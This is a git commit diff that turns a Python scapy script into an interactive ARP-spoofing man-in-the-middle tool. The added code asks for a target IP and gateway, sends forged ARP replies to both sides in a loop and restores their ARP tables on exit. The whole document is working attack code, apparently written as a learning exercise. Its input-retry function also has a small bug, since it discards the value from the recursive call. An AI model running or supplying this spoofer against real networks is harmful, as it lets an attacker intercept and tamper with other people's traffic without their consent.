eb386c17109435b69be8c2b5da26954d1531eb75
A1DS19 <jp06171@gmail.com>
2021-08-03 02:02:22 +0100

    MITM works

--- main.py
+++ main.py
@@ -5,6 +5,17 @@ import time
 # pdst: IP de target
 # hwdst: MAC address de target
 # psrc: Default gateway
+# hwsrc: Default gateway MAC address
+
+
+def get_input():
+    target_ip = input("[+]Target IP: ")
+    default_gateway = input("[+]Default gateway: ")
+    if target_ip and default_gateway:
+        return target_ip, default_gateway
+    else:
+        print("[-]Invalid data try again")
+        get_input()
 
 
 def get_target_MAC(target_ip):
@@ -12,8 +23,11 @@ def get_target_MAC(target_ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_req_broadcast = broadcast / arp_req
     answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
-    found_target = answer_list[0]
-    return found_target[0][1].hwsrc
+    if len(answer_list) > 0:
+        found_target = answer_list[0]
+        return found_target[0][1].hwsrc
+    else:
+        print("MAC address not found")
 
 
 def spoof(target_ip, default_gateway):
@@ -22,13 +36,31 @@ def spoof(target_ip, default_gateway):
     scapy.send(new_packet, verbose=False)
 
 
-sent_packets_count = 0
-while True:
-    # send packet to client
-    spoof("192.168.188.15", "192.168.188.1")
-    # send packet to router
-    spoof("192.168.188.1", "192.168.188.15")
+def restore_arp_table(target_ip, default_gateway):
+    target_MAC = get_target_MAC(target_ip)
+    default_gateway_MAC = get_target_MAC(target_ip=default_gateway)
+    new_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC, psrc=default_gateway, hwsrc=default_gateway_MAC)
+    scapy.send(new_packet, count=5, verbose=False)
 
-    sent_packets_count += 2
-    print(f"[+]Packets sent {sent_packets_count}")
-    time.sleep(2)
+
+target_ip, default_gateway = get_input()
+sent_packets_count = 0
+
+try:
+    while True:
+        # send packet to client
+        spoof(target_ip, default_gateway)
+
+        # send packet to router
+        spoof(default_gateway, target_ip)
+
+        sent_packets_count += 2
+        print(f"\r[+]Packets sent {sent_packets_count}", end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[+]Quitting...")
+    print("[+]Restoring arp table for target, please wait...")
+    restore_arp_table(target_ip, default_gateway)
+    restore_arp_table(default_gateway, target_ip)
+    print("[+]Done")
